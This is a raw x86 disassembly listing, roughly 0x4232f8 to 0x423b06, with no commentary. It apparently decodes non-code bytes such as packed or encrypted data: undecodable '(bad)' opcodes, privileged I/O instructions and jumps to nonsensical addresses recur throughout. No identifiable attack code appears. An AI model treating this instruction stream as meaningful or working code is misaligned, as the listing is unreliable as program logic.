  4232f8:	add    bh,BYTE PTR [eax]
  4232fa:	pop    edx
  4232fb:	sub    DWORD PTR [esp+ecx*1+0x0],eax
  4232ff:	mov    ah,0xfd
  423301:	push   cs
  423302:	ins    BYTE PTR es:[edi],dx
  423303:	push   ds
  423304:	add    bh,bl
  423306:	push   ecx
  423307:	fldcw  WORD PTR [esi-0x1cd1f7e0]
  42330d:	in     al,dx
  42330e:	or     BYTE PTR ds:0xa283ff02,dh
  423314:	fstp   DWORD PTR ds:0xedae88fe
  42331a:	ins    DWORD PTR es:[edi],dx
  42331b:	push   ds
  42331c:	fst    DWORD PTR [edx+0x29cb31ef]
  423322:	add    al,0xdf
  423324:	sbb    ebp,edi
  423326:	or     eax,0x4ee56935
  42332b:	pop    edi
  42332c:	lods   al,BYTE PTR ds:[esi]
  42332d:	test   eax,0x6ae44544
  423332:	push   eax
  423333:	jle    0x42331a
  423335:	mov    ebx,0xad7700d8
  42333a:	cmc    
  42333b:	inc    ebx
  42333c:	bound  edx,QWORD PTR [edi-0x719df3d9]
  423342:	pop    esi
  423343:	call   0x683c1178
  423348:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423349:	fxam   
  42334b:	xor    DWORD PTR [ecx-0x69f44b9c],edx
  423351:	mov    al,0x41
  423353:	mov    edi,0x7fe9d9b0
  423358:	and    ch,BYTE PTR [ebp-0x35]
  42335b:	fmul   DWORD PTR [edi-0x1b]
  42335e:	jg     0x42339f
  423360:	(bad)  
  423361:	clc    
  423362:	repz (bad)
  423365:	cdq    
  423366:	jmp    0xf3a025f7
  42336b:	dec    edi
  42336c:	inc    esi
  42336d:	mov    ah,0x73
  42336f:	call   DWORD PTR [esi-0x30]
  423372:	repz ds jb 0x42338f
  423376:	pop    ebp
  423377:	or     ecx,ecx
  423379:	ins    DWORD PTR es:[edi],dx
  42337a:	in     eax,dx
  42337b:	fsubr  DWORD PTR [edi+0x11]
  42337e:	stc    
  42337f:	inc    ebx
  423380:	bound  esp,QWORD PTR [ebx+eiz*1+0xc]
  423384:	mov    al,ds:0x5fece8de
  423389:	clc    
  42338a:	xor    esi,esp
  42338c:	test   al,0x6d
  42338e:	add    ch,ah
  423390:	push   edx
  423391:	hlt    
  423392:	adc    al,0xe1
  423394:	test   DWORD PTR [edi-0x69b7ba00],esi
  42339a:	mov    esi,0xeb6100ed
  42339f:	add    al,0xd9
  4233a1:	add    eax,0x33e5009d
  4233a6:	pusha  
  4233a7:	je     0x423376
  4233a9:	pop    ecx
  4233aa:	ins    DWORD PTR es:[edi],dx
  4233ab:	and    dl,BYTE PTR [ecx-0x16ff7504]
  4233b1:	fstp   QWORD PTR [ecx]
  4233b3:	je     0x423381
  4233b5:	cmp    ch,BYTE PTR [ebp-0x26722cf4]
  4233bb:	sti    
  4233bc:	hlt    
  4233bd:	push   ebp
  4233be:	out    0x40,eax
  4233c0:	jmp    0xdcb64d81
  4233c5:	push   esi
  4233c6:	imul   eax,DWORD PTR [esp+edi*4],0xe8001b59
  4233cd:	(bad)  
  4233ce:	cdq    
  4233cf:	or     BYTE PTR [edx+0x62],al
  4233d2:	mov    edi,ebx
  4233d4:	aam    0x1
  4233d6:	into   
  4233d7:	inc    eax
  4233d8:	jmp    0xe9466b28
  4233dd:	xor    ebx,ebp
  4233df:	xor    BYTE PTR [ebp-0x48fb26c3],al
  4233e5:	out    0x6d,al
  4233e7:	and    al,0xf1
  4233e9:	popf   
  4233ea:	mov    ebx,0xd933cfe8
  4233ef:	add    BYTE PTR [ebp-0x5f],ch
  4233f2:	ins    DWORD PTR es:[edi],dx
  4233f3:	sbb    eax,0x66e567ee
  4233f8:	sub    eax,0x1514f266
  4233fd:	shl    BYTE PTR [esi-0x59ff9400],1
  423403:	ins    DWORD PTR es:[edi],dx
  423404:	or     eax,0x75dd0e12
  423409:	add    BYTE PTR [ebx+0x30010034],dh
  42340f:	popf   
  423410:	or     bl,ch
  423412:	mov    esp,es
  423414:	not    DWORD PTR ds:0x3ae9cb
  42341a:	and    eax,0xed00041b
  42341f:	fdiv   DWORD PTR [eax]
  423421:	ins    BYTE PTR es:[edi],dx
  423422:	dec    edi
  423423:	fld    QWORD PTR [esi+edx*2]
  423426:	add    BYTE PTR [ecx-0x4490f3dc],cl
  42342c:	call   0x11f8320
  423431:	test   BYTE PTR [ebx],cl
  423433:	mov    DWORD PTR [edx],edx
  423435:	dec    DWORD PTR [esi]
  423437:	fisub  WORD PTR [edx+0x44]
  42343a:	cmp    ecx,DWORD PTR [edi]
  42343c:	adc    eax,0x9a4934
  423441:	test   DWORD PTR [ebx+0x1b3b0289],ecx
  423447:	loop   0x4234be
  423449:	add    eax,0xeb401a28
  42344e:	xor    ah,al
  423450:	div    DWORD PTR [edi+ebp*2-0x1f]
  423454:	not    DWORD PTR ds:0x3ae937
  42345a:	and    eax,0xce000818
  42345f:	(bad)  
  423460:	in     al,dx
  423461:	test   BYTE PTR [esi],0xca
  423464:	ins    BYTE PTR es:[edi],dx
  423465:	inc    esp
  423466:	add    BYTE PTR [ebx],cl
  423468:	test   BYTE PTR [ecx-0x75],0xc6
  42346c:	loope  0x4234bd
  42346e:	je     0x4234db
  423470:	add    ch,BYTE PTR [ebp+edx*2-0x3f7b2635]
  423477:	dec    edi
  423478:	xchg   edi,eax
  423479:	div    DWORD PTR ds:0x447fd7
  42347f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423480:	call   0xc0a446b3
  423485:	add    al,0x87
  423487:	mov    edx,0x1774d27c
  42348c:	(bad)  [ebx]
  42348e:	add    al,0x2f
  423490:	sar    BYTE PTR [edi+0x7d],1
  423493:	outs   dx,BYTE PTR ds:[esi]
  423494:	add    BYTE PTR [ebx+0xb],cl
  423497:	or     BYTE PTR [eax],dl
  423499:	mov    BYTE PTR [ebx+0x5e],al
  42349c:	mov    al,0x89
  42349e:	inc    ebp
  42349f:	push   esi
  4234a0:	mov    al,0xec
  4234a2:	pop    esp
  4234a3:	mov    bh,bh
  4234a5:	(bad)  
  4234a6:	jle    0x42349f
  4234a8:	out    dx,eax
  4234a9:	(bad)  
  4234aa:	jae    0x4234eb
  4234ac:	(bad)  
  4234ad:	shl    DWORD PTR [ebx+0x5a],cl
  4234b0:	ja     0x4234a2
  4234b2:	mov    edi,0x6604c272
  4234b7:	bound  eax,QWORD PTR [ebx-0x6d26f7b6]
  4234bd:	imul   edx,DWORD PTR [ecx+esi*4],0x573bf093
  4234c4:	inc    edx
  4234c5:	push   edx
  4234c7:	sbb    ch,al
  4234c9:	mov    esi,0x342d0052
  4234ce:	pop    es
  4234cf:	inc    eax
  4234d0:	fstp   TBYTE PTR [ebx]
  4234d2:	repz cli 
  4234d4:	ja     0x42349c
  4234d6:	out    dx,eax
  4234d7:	aas    
  4234d8:	bound  esp,QWORD PTR [esi+ecx*1-0x40]
  4234dc:	and    al,0x4
  4234de:	add    al,0x40
  4234e0:	stc    
  4234e1:	add    eax,0xcb5275d2
  4234e6:	push   eax
  4234e7:	or     al,0x91
  4234e9:	jecxz  0x4234db
  4234eb:	push   edi
  4234ec:	push   esi
  4234ed:	inc    edx
  4234ee:	call   FWORD PTR [edx-0x77]
  4234f1:	push   ebp
  4234f2:	ror    DWORD PTR [edx+eiz*2],0x55
  4234f6:	xchg   ah,ch
  4234f8:	int3   
  4234f9:	std    
  4234fa:	push   cs
  4234fb:	ins    BYTE PTR es:[edi],dx
  4234fc:	es fldl2t 
  4234ff:	call   DWORD PTR [eax+eiz*2]
  423502:	cmp    al,0xc
  423504:	adc    DWORD PTR [ebp+0x59],ebp
  423507:	in     al,dx
  423508:	pop    edx
  423509:	mov    gs,ecx
  42350b:	add    esp,esi
  42350d:	sbb    DWORD PTR ds:0xedaea95d,edi
  423513:	imul   esp,DWORD PTR [esi],0x51efb2d9
  423519:	(bad)  
  42351a:	sub    DWORD PTR [eiz*8+0xed56bf1],eax
  423521:	mov    ds,esi
  423523:	xor    al,0x66
  423525:	outs   dx,BYTE PTR ds:[esi]
  423526:	cmp    ebp,edx
  423528:	icebp  
  423529:	ror    BYTE PTR [edx-0x60ba9b3],1
  42352f:	repz add BYTE PTR [eax+0x6c],ch
  423533:	in     eax,dx
  423534:	aam    0xd7
  423536:	in     eax,0x72
  423538:	out    dx,eax
  423539:	adc    ecx,ecx
  42353b:	sub    DWORD PTR [ecx*8-0x31fc068a],eax
  423542:	(bad)  
  423543:	mov    bl,0xd4
  423545:	mov    cl,0xe1
  423547:	push   edx
  423548:	out    dx,eax
  423549:	cmc    
  42354a:	enter  0x3a9,0xc4
  42354e:	fld    DWORD PTR [edx+0x4d]
  423551:	pop    edx
  423552:	pusha  
  423553:	cmp    DWORD PTR [edx+0x76],ebp
  423556:	mov    BYTE PTR [edx],dh
  423558:	out    dx,eax
  423559:	pop    ecx
  42355a:	into   
  42355b:	test   eax,0xfe111103
  423560:	ret    
  423561:	mov    al,0xf4
  423563:	xchg   ecx,eax
  423564:	or     esp,DWORD PTR [edx-0x708559e]
  42356a:	int    0x25
  42356c:	hlt    
  42356d:	sub    eax,0xe469a3d9
  423572:	sbb    eax,0x3a02e2
  423577:	add    ah,ah
  423579:	scas   al,BYTE PTR es:[edi]
  42357a:	ins    DWORD PTR es:[edi],dx
  42357b:	adc    dh,ch
  42357d:	sbb    al,0xe5
  42357f:	dec    edi
  423580:	out    0xb4,al
  423582:	(bad)  
  423583:	adc    eax,0x57906629
  423588:	xor    al,0xa0
  42358a:	in     al,0x0
  42358c:	push   0xe90400c5
  423591:	popa   
  423592:	mov    ss,WORD PTR [edx+0x16]
  423595:	add    bl,ch
  423597:	icebp  
  423598:	mov    al,cs:0xe88057ea
  42359e:	popa   
  42359f:	fld    DWORD PTR [ebp+0x51e415a9]
  4235a5:	cmp    DWORD PTR [edi+0x21fb88cd],edx
  4235ab:	fnstcw WORD PTR ds:0xd960eb
  4235b1:	mul    ch
  4235b3:	mov    bh,0x1
  4235b5:	jmp    0xf5f59a1b
  4235ba:	pusha  
  4235bb:	fld    DWORD PTR [eax]
  4235bd:	bound  esp,QWORD PTR [edi]
  4235bf:	add    dl,cl
  4235c1:	cmp    ch,BYTE PTR [esi]
  4235c3:	out    dx,eax
  4235c4:	mov    WORD PTR [ebp+0x5d],gs
  4235c7:	repz std 
  4235c9:	call   0x427a372f
  4235ce:	popa   
  4235cf:	(bad)  [ebp+0xd8b391]
  4235d5:	jmp    0x112a5ac4
  4235da:	(bad)  
  4235dc:	cli    
  4235dd:	and    DWORD PTR fs:[edx+0x49],esi
  4235e1:	xchg   ebx,eax
  4235e2:	cmc    
  4235e3:	gs dec esp
  4235e5:	lds    ebx,FWORD PTR [ebp-0x78]
  4235e8:	push   eax
  4235e9:	mov    esp,0xb9501952
  4235ee:	push   ss
  4235ef:	int    0xf8
  4235f1:	add    BYTE PTR [edx],cl
  4235f3:	xchg   edi,eax
  4235f4:	add    BYTE PTR [ebp+0x332a8c8b],al
  4235fa:	add    BYTE PTR [edx+0x74c3994],al
  423600:	in     eax,dx
  423601:	outs   dx,BYTE PTR ds:[esi]
  423602:	or     bh,BYTE PTR [eax]
  423604:	and    eax,0x7f677d14
  423609:	mov    DWORD PTR [edi+eax*4-0x43],ecx
  42360d:	lea    eax,[edi+eiz*2-0x43]
  423611:	push   eax
  423612:	mov    edx,0x447967
  423617:	push   cs
  423618:	pop    ecx
  423619:	and    al,0xfc
  42361b:	mov    edx,esi
  42361d:	add    al,ch
  42361f:	ss pop ecx
  423621:	idiv   bh
  423623:	neg    BYTE PTR [edi+eax*1]
  423626:	xchg   ebp,eax
  423627:	retf   
  423628:	popa   
  423629:	shl    BYTE PTR [ebp-0x7f],0xcb
  42362d:	shl    BYTE PTR [esi+0x2],0x61
  423631:	and    al,0xf8
  423633:	jnp    0x42360b
  423635:	add    BYTE PTR [ecx+0xdbed],bh
  42363b:	mov    esi,0x38022461
  423640:	(bad)  
  423641:	add    BYTE PTR [ebx],dh
  423643:	mov    DWORD PTR [ebp+0x10],esi
  423646:	inc    eax
  423647:	repnz nop
  423649:	repnz push edx
  42364b:	mov    esi,0x3b942471
  423650:	(bad)  
  423651:	add    BYTE PTR [ecx+0x292fb4ae],bh
  423657:	mov    bl,0xa6
  423659:	dec    edx
  42365a:	add    BYTE PTR [ebx],cl
  42365c:	retf   
  42365d:	leave  
  42365e:	push   0x0
  423660:	(bad)  
  423661:	test   al,0x55
  423663:	push   ecx
  423664:	mov    fs,WORD PTR [ecx+0x6bb5024]
  42366a:	adc    eax,0x3ef26264
  42366f:	add    cl,ah
  423671:	mov    ebx,0xec6dfb00
  423676:	jg     0x4235fc
  423678:	xchg   BYTE PTR [esp+eax*1+0x60796200],cl
  42367f:	and    al,0x1e
  423681:	jns    0x4236cb
  423683:	and    al,0x2e
  423685:	sti    
  423686:	test   DWORD PTR [edi+0x53],0x1e8d04c0
  42368d:	in     al,0xf4
  42368f:	dec    edi
  423690:	fistp  QWORD PTR [ebx-0x10edb3d8]
  423696:	fist   WORD PTR [ebp-0x28]
  423699:	out    dx,eax
  42369a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42369b:	inc    eax
  42369c:	bound  edi,QWORD PTR [ebp+0x7b]
  42369f:	and    al,0x66
  4236a1:	add    edi,edi
  4236a3:	(bad)  
  4236a4:	jp     0x423719
  4236a6:	mov    ah,0xfb
  4236a8:	jge    0x423726
  4236aa:	mov    edi,0xbf0e5e75
  4236af:	out    0x31,eax
  4236b1:	(bad)  
  4236b2:	hlt    
  4236b3:	mov    WORD PTR [esi],ds
  4236b5:	and    al,0xf3
  4236b7:	dec    edi
  4236b8:	mov    ah,0x4a
  4236ba:	inc    eax
  4236bb:	call   0xe8993922
  4236c0:	popa   
  4236c1:	add    bh,bh
  4236c3:	cli    
  4236c4:	add    ch,cl
  4236c6:	out    0xcd,al
  4236c8:	adc    eax,0x3ef4ea
  4236cd:	ffreep st(2)
  4236cf:	push   ebx
  4236d0:	push   cs
  4236d1:	xchg   edi,eax
  4236d2:	lahf   
  4236d3:	sbb    ebx,edi
  4236d5:	dec    edi
  4236d6:	push   0xfffffff4
  4236d8:	aas    
  4236d9:	bound  ebp,QWORD PTR [ebx-0x3f]
  4236dc:	call   0xfc110bbc
  4236e1:	stc    
  4236e2:	mov    ebx,0xd9a5018f
  4236e7:	ret    
  4236e8:	xor    bl,ah
  4236ea:	adc    eax,0xd9620711
  4236ef:	es cmp ch,ah
  4236f2:	std    
  4236f3:	gs out 0xea,eax
  4236f6:	pop    esp
  4236f7:	adc    eax,0xe8832cef
  4236fc:	shr    BYTE PTR [edi+0x25],cl
  4236ff:	xlat   BYTE PTR ds:[ebx]
  423700:	inc    ebx
  423701:	bound  ecx,QWORD PTR [ecx-0x33f20816]
  423707:	sub    DWORD PTR [ecx+edi*4],eax
  42370a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42370b:	cmc    
  42370c:	pop    ebp
  42370d:	push   ds
  42370e:	(bad)  
  423710:	idiv   ebp
  423712:	retf   
  423713:	sub    DWORD PTR [esi*2-0x18c131ec],eax
  42371a:	and    dh,BYTE PTR ds:0xd95dd30
  423720:	cld    
  423721:	push   esp
  423722:	(bad)  
  423723:	fstp   DWORD PTR [ebp+0x1e]
  423726:	fstp   DWORD PTR [esi+ecx*1]
  423729:	add    ch,bh
  42372b:	ins    BYTE PTR es:[edi],dx
  42372c:	(bad)  
  42372f:	data16 (bad) 
  423731:	mov    ds:0x425834a,al
  423736:	fld    QWORD PTR [ebp-0x25380c33]
  42373c:	in     al,0xf7
  42373e:	(bad)  
  42373f:	fldl2t 
  423741:	xor    ecx,DWORD PTR [ebx]
  423743:	loope  0x423744
  423745:	inc    edi
  423746:	bound  eax,QWORD PTR [ecx]
  423748:	mov    edx,0x6df039d8
  42374d:	dec    DWORD PTR [ebp-0x7d]
  423750:	lods   eax,DWORD PTR ds:[esi]
  423751:	add    ebx,edx
  423753:	pop    ecx
  423754:	add    eax,0x42d96203
  423759:	pop    ss
  42375a:	jbe    0x4236df
  42375c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42375d:	add    ebx,DWORD PTR [ecx]
  42375f:	mov    BYTE PTR [eax],0x79
  423762:	adc    al,0xb0
  423764:	add    BYTE PTR [edx+0x74fb774e],bl
  42376a:	stos   BYTE PTR es:[edi],al
  42376b:	mov    ch,0x10
  42376d:	mov    ecx,0xfdc4c612
  423772:	mov    eax,ds:0xdf2187d9
  423777:	icebp  
  423778:	cli    
  423779:	jl     0x42377c
  42377b:	rol    al,0x64
  42377e:	sbb    esp,esp
  423780:	xchg   esp,eax
  423781:	sub    DWORD PTR [edi+0x58],edi
  423784:	in     eax,0x8c
  423786:	sahf   
  423787:	pop    ecx
  423788:	in     al,dx
  423789:	ins    DWORD PTR es:[edi],dx
  42378a:	popa   
  42378b:	fld    DWORD PTR [eax]
  42378d:	cmp    al,BYTE PTR [eax]
  42378f:	ins    DWORD PTR es:[edi],dx
  423790:	mov    edx,DWORD PTR [ebx+0x62]
  423793:	xchg   edi,eax
  423794:	push   edi
  423795:	stc    
  423796:	bound  esp,QWORD PTR [ebx-0x4c452700]
  42379c:	repz or dh,BYTE PTR [esi-0x5f]
  4237a0:	popa   
  4237a1:	inc    esp
  4237a2:	or     eax,0xde01378a
  4237a7:	fcomp  QWORD PTR [ebp+0x5e61e901]
  4237ad:	inc    esp
  4237ae:	lds    esi,FWORD PTR [ecx-0x61]
  4237b1:	push   edx
  4237b2:	xchg   esi,eax
  4237b3:	je     0x423834
  4237b5:	adc    eax,0xc0565e29
  4237ba:	std    
  4237bb:	mov    dl,BYTE PTR [esi+0x53]
  4237be:	sub    eax,0x2e8befb4
  4237c3:	xchg   esi,eax
  4237c4:	mov    DWORD PTR [ebp+0x50a97a25],ecx
  4237ca:	xchg   bp,ax
  4237cc:	mov    ch,0x1c
  4237ce:	ins    BYTE PTR es:[edi],dx
  4237cf:	mov    ds:0xed40e8ad,al
  4237d4:	repnz cli 
  4237d6:	pop    esp
  4237d7:	gs mov ch,0x28
  4237da:	add    BYTE PTR [ebx+0x54ff4021],dh
  4237e0:	ins    BYTE PTR es:[edi],dx
  4237e1:	fsubr  st,st(3)
  4237e3:	stc    
  4237e4:	(bad)  
  4237e5:	ror    DWORD PTR [ebx+0x98b687],cl
  4237eb:	or     ebx,ebx
  4237ed:	test   bl,bl
  4237ef:	iret   
  4237f0:	scas   eax,DWORD PTR es:[edi]
  4237f1:	out    dx,al
  4237f2:	inc    esp
  4237f3:	add    BYTE PTR [edi],bl
  4237f5:	out    0xa,eax
  4237f7:	jne    0x4237b6
  4237f9:	or     DWORD PTR [edi+0xc],ebp
  4237fc:	fs out 0x42,eax
  4237ff:	adc    DWORD PTR [ebx],ecx
  423801:	fild   DWORD PTR [edi]
  423803:	mov    bh,0x6
  423805:	out    dx,eax
  423806:	add    eax,0xbff2feb7
  42380b:	loope  0x4237c8
  42380d:	repz ret 0xcc0f
  423811:	mov    al,ds:0x47c45100
  423816:	dec    ebp
  423817:	add    al,0xfa
  423819:	hlt    
  42381a:	ud2    
  42381c:	shl    DWORD PTR [edi+esi*8-0x85b6c89],cl
  423823:	adc    eax,0x3af103
  423828:	(bad)  
  423829:	adc    al,0x74
  42382b:	adc    edx,DWORD PTR [ecx-0x7f]
  42382e:	div    DWORD PTR [edi-0x79]
  423831:	pop    ds
  423832:	adc    eax,0x9a6988
  423837:	test   DWORD PTR [ebx+0x4bbc7eee],edi
  42383d:	fiadd  DWORD PTR [eax]
  42383f:	mov    eax,DWORD PTR [ecx*1+0x1ed4fd4a]
  423846:	test   al,al
  423848:	dec    edi
  423849:	lea    eax,[ebx+0x10903b47]
  42384f:	push   ebp
  423850:	ds out 0xff,al
  423853:	jmp    DWORD PTR [edx+0x0]
  423856:	das    
  423857:	call   0x4d8255c
  42385c:	add    BYTE PTR ds:0x6ffafb2f,bl
  423862:	sub    ah,dh
  423864:	aas    
  423865:	bound  ecx,QWORD PTR [esi+0x59]
  423868:	cld    
  423869:	add    eax,0xb5faf727
  42386e:	addr16 add eax,0xf9cf6200
  423874:	daa    
  423875:	push   edi
  423876:	inc    eax
  423877:	inc    DWORD PTR [edx+eiz*1-0x3597f3bc]
  42387e:	add    bh,bh
  423880:	call   ebp
  423882:	data16 sti 
  423884:	cli    
  423885:	ja     0x4238ff
  423887:	out    dx,al
  423888:	aas    
  423889:	bound  esi,QWORD PTR [ebp-0x3c]
  42388c:	jne    0x4238e0
  42388e:	imul   eax,DWORD PTR [edx+0x10],0xffffffe2
  423892:	aaa    
  423893:	and    eax,DWORD PTR [ecx]
  423895:	bound  eax,QWORD PTR [eax]
  423897:	add    al,0x75
  423899:	dec    ecx
  42389a:	jp     0x42385a
  42389c:	out    0x3,eax
  42389e:	gs xchg edx,eax
  4238a0:	jl     0x423905
  4238a2:	add    bh,bh
  4238a4:	bound  esp,QWORD PTR gs:[edi]
  4238a7:	adc    eax,0xf4786ffb
  4238ac:	aas    
  4238ad:	bound  ebp,QWORD PTR [ebx-0x43]
  4238b0:	call   0xfc0c683c
  4238b5:	fnstcw WORD PTR [ebx+0x23]
  4238b8:	pushf  
  4238b9:	bound  eax,QWORD PTR [eax]
  4238bb:	push   edx
  4238bd:	add    BYTE PTR [edx+0x62ffff1e],ah
  4238c3:	ret    0x3859
  4238c6:	mov    bh,0x7f
  4238c8:	mov    edi,0x438db204
  4238cd:	and    al,0x82
  4238cf:	fnstcw WORD PTR [ecx-0xb62b032]
  4238d5:	inc    ebx
  4238d6:	bound  ebx,QWORD PTR [esi-0x53]
  4238d9:	daa    
  4238da:	dec    edx
  4238db:	jg     0x4238c0
  4238dd:	xor    ebx,DWORD PTR [ecx]
  4238df:	and    eax,0xd962049d
  4238e4:	cmp    bh,al
  4238e6:	std    
  4238e7:	lds    ebp,FWORD PTR [ecx+0x595d703]
  4238ed:	in     al,dx
  4238ee:	xchg   esp,ebx
  4238f0:	(bad)  
  4238f1:	stc    
  4238f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4238f3:	in     al,dx
  4238f4:	push   ecx
  4238f5:	aaa    
  4238f6:	arpl   cx,bx
  4238f8:	jmp    0xf4e388cb
  4238fd:	inc    ebx
  4238fe:	bound  ebp,QWORD PTR [ecx]
  423900:	call   0x9ed07133
  423905:	test   BYTE PTR [esi+0x6203e955],ah
  42390b:	pop    ss
  42390c:	loope  0x423911
  42390e:	pop    ss
  42390f:	pusha  
  423910:	aad    0x81
  423912:	mov    esi,0x4ee065f1
  423917:	mov    BYTE PTR [ebx],bh
  423919:	jns    0x4238cf
  42391b:	test   BYTE PTR [esi+0x46],bl
  42391e:	jbe    0x423980
  423920:	mov    al,ds:0xad6200c5
  423925:	jmp    0x3b2e9b2d
  42392a:	clc    
  42392b:	adc    al,0xec
  42392d:	rol    DWORD PTR [edi+0x57],cl
  423930:	cdq    
  423931:	jmp    0x661edbbc
  423936:	imul   esp,DWORD PTR [edx-0x27],0xffffffe9
  42393a:	js     0x42395c
  42393c:	lds    edx,FWORD PTR [edx-0x162679bc]
  423942:	add    esp,DWORD PTR [edx-0x37811b9b]
  423948:	aad    0x0
  42394a:	sbb    BYTE PTR [ebp+0x54],0x3a
  42394e:	push   0x27
  423950:	mov    ch,0xf3
  423952:	test   eax,0xe900d97d
  423957:	xor    DWORD PTR [eax+0x44],ebp
  42395a:	mov    esi,0xb91418e2
  42395f:	pushf  
  423960:	xchg   ebp,eax
  423961:	and    al,0xe5
  423963:	push   ecx
  423964:	lock adc al,0xad
  423967:	adc    al,0xac
  423969:	add    BYTE PTR [esi+ebx*1-0x20],ch
  42396d:	xchg   ebp,eax
  42396e:	sub    edx,ebp
  423970:	sbb    BYTE PTR [ebp-0x28],dh
  423973:	jp     0x42390c
  423975:	adc    al,0x6a
  423977:	lds    edx,FWORD PTR es:[eax+0x16]
  42397b:	in     eax,dx
  42397c:	adc    DWORD PTR ds:0xc05661a9,0x7d
  423983:	xchg   ecx,eax
  423984:	push   esp
  423985:	inc    edx
  423986:	aad    0x0
  423988:	xchg   esi,eax
  423989:	ins    BYTE PTR es:[edi],dx
  42398a:	shr    ch,0x91
  42398d:	pop    esi
  42398e:	inc    esp
  42398f:	(bad)
  423992:	sti    
  423993:	cld    
  423994:	jne    0x42395c
  423996:	inc    eax
  423997:	jmp    0x7c4d5280
  42399c:	mov    eax,ds:0xa61afdf3
  4239a1:	push   esp
  4239a2:	sar    BYTE PTR ds:0xd571f06e,0xa
  4239a9:	fist   WORD PTR [ebx+0x62]
  4239ac:	rol    BYTE PTR [eax],cl
  4239ae:	fld    TBYTE PTR [esi+ebp*4-0x7107911]
  4239b5:	xchg   esp,eax
  4239b6:	and    al,0xf9
  4239b8:	jmp    0x2494:0xe93a1496
  4239bf:	shr    DWORD PTR [esi],0xc5
  4239c2:	mov    WORD PTR [eax],es
  4239c4:	aaa    
  4239c5:	xchg   edi,eax
  4239c6:	add    BYTE PTR [ebp-0x74fc7d05],al
  4239cc:	jmp    0x423a39
  4239ce:	dec    esp
  4239cf:	and    al,0x1b
  4239d1:	punpcklbw mm3,DWORD PTR [ebx+ecx*2]
  4239d5:	xlat   BYTE PTR ds:[ebx]
  4239d6:	push   edi
  4239d7:	pop    esi
  4239d8:	retf   
  4239d9:	xlat   BYTE PTR ds:[ebx]
  4239da:	push   ebx
  4239db:	mov    edx,DWORD PTR [esi+0x5f81bbbb]
  4239e1:	out    0xfc,al
  4239e3:	dec    DWORD PTR [ebx]
  4239e5:	pop    edx
  4239e6:	dec    esp
  4239e7:	and    al,0x7
  4239e9:	push   ds
  4239ea:	dec    ebx
  4239eb:	push   ebp
  4239ec:	add    ch,ah
  4239ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4239ef:	cmp    edx,0xffffff80
  4239f2:	cvtpi2ps xmm3,mm3
  4239f5:	mov    edx,0xd10662a7
  4239fa:	ror    BYTE PTR [ebp-0x7c30e8ac],cl
  423a00:	int    0x63
  423a02:	loope  0x4239ae
  423a04:	call   FWORD PTR [ecx+esi*2-0x74]
  423a08:	and    al,0x17
  423a0a:	fld    DWORD PTR [eax]
  423a0c:	add    BYTE PTR [esi],bh
  423a0e:	xchg   edx,eax
  423a0f:	and    al,0x18
  423a11:	(bad)  [ecx-0x31]
  423a14:	call   0x38a7f3
  423a19:	xor    BYTE PTR ds:0xbd07f685,al
  423a1f:	jnp    0x4239dd
  423a21:	addr16 mov ecx,0xd68bfffa
  423a27:	je     0x423a41
  423a29:	int3   
  423a2a:	dec    ecx
  423a2b:	and    al,0x24
  423a2d:	jns    0x423a05
  423a2f:	add    bh,bh
  423a31:	idiv   DWORD PTR [eax-0x2974fdc8]
  423a37:	not    DWORD PTR ds:0x3ae1ef
  423a3d:	bound  edi,QWORD PTR [ebp-0x3c]
  423a40:	je     0x4239e5
  423a42:	pop    ebx
  423a43:	nop
  423a44:	and    al,0x8a
  423a46:	(bad)  
  423a47:	(bad)  
  423a48:	(bad)  
  423a49:	fistp  QWORD PTR [ebx+0x1b81820]
  423a4f:	pop    ebp
  423a50:	add    BYTE PTR [eax],al
  423a52:	retf   0xff00
  423a55:	jmp    DWORD PTR [edx]
  423a57:	jae    0x4239e9
  423a59:	and    al,0xa6
  423a5b:	(bad)  
  423a5c:	(bad)  
  423a5d:	(bad)  
  423a5e:	cmp    al,ah
  423a60:	sbb    eax,0xc4746201
  423a65:	jne    0x423adc
  423a67:	xchg   ebx,eax
  423a68:	icebp  
  423a69:	inc    ebx
  423a6a:	jo     0x423aac
  423a6c:	(bad)  
  423a6d:	jle    0x423a79
  423a6f:	push   eax
  423a70:	dec    ebx
  423a71:	add    edi,DWORD PTR [edi]
  423a73:	arpl   WORD PTR [eax+eax*1],ax
  423a76:	bound  ecx,QWORD PTR [ebp-0x6]
  423a79:	stc    
  423a7a:	and    DWORD PTR [eax+0x7e5564cb],eax
  423a80:	push   ebx
  423a81:	sti    
  423a82:	fstp   st(2)
  423a84:	adc    esi,edx
  423a86:	out    0x23,eax
  423a88:	sbb    edx,DWORD PTR [edx+edi*4]
  423a8b:	in     al,dx
  423a8c:	push   ss
  423a8d:	add    DWORD PTR [edx+0x77],esp
  423a90:	mov    esi,0x2a5d1c5b
  423a95:	sbb    DWORD PTR [esi+0x620004ef],0x10ffeb3e
  423a9f:	stos   BYTE PTR es:[edi],al
  423aa0:	jnp    0x423a7b
  423aa2:	xor    eax,0x6b364646
  423aa7:	add    BYTE PTR [edx],dl
  423aa9:	leave  
  423aaa:	jp     0x423a6b
  423aac:	xchg   ebp,eax
  423aad:	sti    
  423aae:	test   DWORD PTR [eax-0x29],ebp
  423ab1:	(bad)  
  423ab2:	jge    0x423ab3
  423ab4:	int    0xe1
  423ab6:	add    cl,ch
  423ab8:	fcomp  DWORD PTR [edi-0x4f5a6c82]
  423abe:	jle    0x423b32
  423ac0:	add    ch,al
  423ac2:	xchg   esp,eax
  423ac3:	pop    ecx
  423ac4:	jmp    0x1f97f79e
  423ac9:	(bad)  
  423acb:	mov    edx,0x6203c2c9
  423ad0:	int3   
  423ad1:	mov    ds:0xc0f19234,al
  423ad6:	aad    0x63
  423ad8:	(bad)  
  423ada:	push   es
  423adb:	in     eax,0x95
  423add:	add    eax,0xed8c54f4
  423ae2:	sub    bh,BYTE PTR [eax-0x4c8317ae]
  423ae8:	fstp   QWORD PTR [esi+0x6ed966c5]
  423aee:	aas    
  423aef:	ds leave 
  423af1:	out    dx,al
  423af2:	aas    
  423af3:	inc    esi
  423af4:	shl    DWORD PTR [edx+0x6ed387f4],1
  423afa:	aas    
  423afb:	inc    esi
  423afc:	aad    0xde
  423afe:	aas    
  423aff:	fstp   QWORD PTR ds:[edx-0x56e67300]
  423b06:	(bad)  
